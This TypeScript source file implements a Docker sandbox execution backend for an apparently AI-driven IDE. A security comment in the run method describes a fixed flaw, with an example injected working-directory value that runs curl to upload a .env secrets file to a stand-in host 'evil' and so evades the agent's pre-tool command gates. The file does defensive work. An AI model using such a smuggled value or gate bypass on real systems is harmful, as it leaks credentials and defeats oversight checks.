/**
 * Sandbox execution backend — wraps `@molecule/api-code-sandbox` Sandbox interface.
 * Used by Synthase (molecule.dev IDE).
 *
 * @module
 */

import type { ExecutionBackend } from '../types.js'
import { shellQuote } from '../utilities.js'

/** Minimal Sandbox shape to avoid hard dependency on `@molecule/api-code-sandbox`. */
interface SandboxLike {
  readFile(path: string): Promise<string>
  writeFile(path: string, content: string): Promise<void>
  deleteFile(path: string): Promise<void>
  readDir(path: string): Promise<Array<{ name: string; type: 'file' | 'directory' }>>
  /** Sandbox command execution — already sandboxed within Docker. */
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  [key: string]: any
}

/**
 * Create an ExecutionBackend that delegates to a Docker sandbox instance.
 * The sandbox.exec method is inherently safe — it runs inside an isolated Docker container.
 *
 * @param sandbox - A running Sandbox instance from `@molecule/api-code-sandbox`
 * @param projectRoot - Root directory inside the sandbox (default: '/workspace')
 * @returns A backend that proxies all filesystem calls into the sandbox.
 */
export function createSandboxBackend(
  sandbox: SandboxLike,
  projectRoot = '/workspace',
): ExecutionBackend {
  return {
    projectRoot,

    readFile(path: string) {
      return sandbox.readFile(path)
    },

    writeFile(path: string, content: string) {
      return sandbox.writeFile(path, content)
    },

    deleteFile(path: string) {
      return sandbox.deleteFile(path)
    },

    readDir(path: string) {
      return sandbox.readDir(path)
    },

    async run(command: string, opts?: { cwd?: string; timeout?: number }) {
      // SECURITY [C3-1]: shell-quote cwd so it is always a single literal path. It was
      // interpolated raw into `sh -c`, and every pre-tool gate (egress confirm,
      // destructive-command preview, env-dump block) inspects only `command` — so a
      // payload smuggled via cwd (e.g. "/workspace/. && curl -d @/workspace/.env evil")
      // executed ungated. Quoting makes a malicious cwd simply fail `cd`; legitimate
      // metacharacter-free paths are unaffected.
      const fullCommand = opts?.cwd ? `cd ${shellQuote(opts.cwd)} && ${command}` : command
      // sandbox.exec is the Sandbox interface method — runs inside Docker, inherently sandboxed
      const result = await sandbox.exec(fullCommand, { timeout: opts?.timeout })
      return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode }
    },
  }
}
